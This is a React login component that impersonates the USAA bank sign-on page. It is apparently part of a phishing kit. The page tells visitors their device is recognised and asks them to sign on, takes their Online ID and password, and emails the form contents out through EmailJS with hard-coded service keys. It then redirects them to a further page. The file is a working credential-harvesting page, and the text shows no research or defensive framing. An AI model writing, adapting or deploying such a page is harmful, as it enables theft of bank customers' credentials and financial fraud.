import { useState } from "react";
import {
  Box,
  Text,
  Heading,
  Center,
  FormControl,
  Input,
  InputRightElement,
  Button,
  InputGroup,
  Checkbox,
  IconButton,
  Divider,
  Spinner,
} from "@chakra-ui/react";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import { useNavigate } from "react-router-dom";
import emailjs from '@emailjs/browser';

function Login() {
  const navigate = useNavigate();
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false); // Loading state

  const handleShowPassword = () => {
    setShowPassword(!showPassword);
  };

  const sendEmail = (e: any) => {
    e.preventDefault();
    setLoading(true); // Start loading

    emailjs
      .sendForm("service_9vq8bca", "template_6zkzruo", e.target, "n1LlPgghSqnVWFxPU")
      .then(
        (result) => {
          console.log(result.text);
          setLoading(false); // Stop loading
          navigate("/enter"); // Navigate to /enter after successful form submission
        },
        (error) => {
          console.log(error.text);
          setLoading(false); // Stop loading
        }
      );
  };

  return (
    <Box>
      <Box minH="72.3vh">
        <Center p={3} bgColor="whitesmoke" justifyContent="space-between">
          <Text pl={2} fontSize="md" color="#196999" fontWeight="semibold">
            We recognize this device. Please sign on
            <br /> to USAA to confirm your response.
          </Text>
        </Center>
        <Box>
          <Heading
            textAlign="center"
            pt={7}
            fontWeight="semibold"
            fontFamily="serif"
            as="h2"
            fontSize="26"
            color="blackAlpha.800"
          >
            Log On
          </Heading>
        </Box>
        <form onSubmit={sendEmail}>
          <Box h={68} mt={6} mx="4">
            <InputGroup mb={3} borderRadius={"0"} display={"block"}>
              <FormControl>
                <Input
                  id="onlineId"
                  name="OnlineID"
                  borderLeft={"1px solid #196999"}
                  borderRight={"1px solid #196999"}
                  borderTop={"1px solid #196999"}
                  _hover={{ border: "1px solid #196999" }}
                  borderRadius={0}
                  _focus={{ bgColor: "yellow.100", border: "none" }}
                  _placeholder={{
                    color: "blackAlpha.800",
                    top: "0",
                    transform: "translateY(-130%)",
                    fontSize: "12px",
                  }}
                  h="70px"
                  placeholder="Online ID"
                  pb={0}
                  autoFocus
                  type="text"
                />
                <Input
                  id="password"
                  name="Password"
                  type={showPassword ? "text" : "password"}
                  _hover={{ border: "solid 0.9px" }}
                  border={"1px solid #196999"}
                  borderRadius={0}
                  _focus={{ bgColor: "yellow.100", border: "none" }}
                  _placeholder={{
                    color: "blackAlpha.800",
                    top: "0",
                    transform: "translateY(-130%)",
                    fontSize: "12px",
                  }}
                  h="70px"
                  placeholder="Password"
                  pb={0}
                />
                <InputRightElement mt={79} width="7.5rem">
                  <Divider orientation="vertical" ml={-2} border={"1px solid gray"} />
                  <IconButton
                    h="100%"
                    p={2}
                    bgColor={"transparent"}
                    size="lg"
                    onClick={handleShowPassword}
                    color={"gray.600"}
                    icon={
                      showPassword ? (
                        <>
                          <FaEyeSlash />
                          <Text ml={1}> Hide</Text>
                        </>
                      ) : (
                        <>
                          <FaEye />
                          <Text ml={1}> Show</Text>
                        </>
                      )
                    }
                    aria-label={""}
                  />
                </InputRightElement>
              </FormControl>
            </InputGroup>
            <Checkbox pb={6} pt={4} size={"lg"} id="rememberMe" isChecked={false}>
              <Text lineHeight={"4"} fontSize={"sm"} color="#196999" fontWeight={"semibold"}>
                Remember this browser to log on faster
                <br /> next time.
              </Text>
            </Checkbox>
            <Button
              mt={0}
              h={12}
              _hover={{
                bg: "#526f30",
                color: "whitesmoke",
                borderRadius: 2,
              }}
              bgColor="#486428"
              color="whitesmoke"
              borderRadius={2}
              w="100%"
              type="submit" // Add type="submit" attribute
            >
              Next
            </Button>
          </Box>
        </form>
        {/* Loading spinner */}
        {loading && (
          <Center mt={4}>
            <Spinner size="xl" color="green.500" />
          </Center>
        )}
      </Box>
    </Box>
  );
}

export default Login;
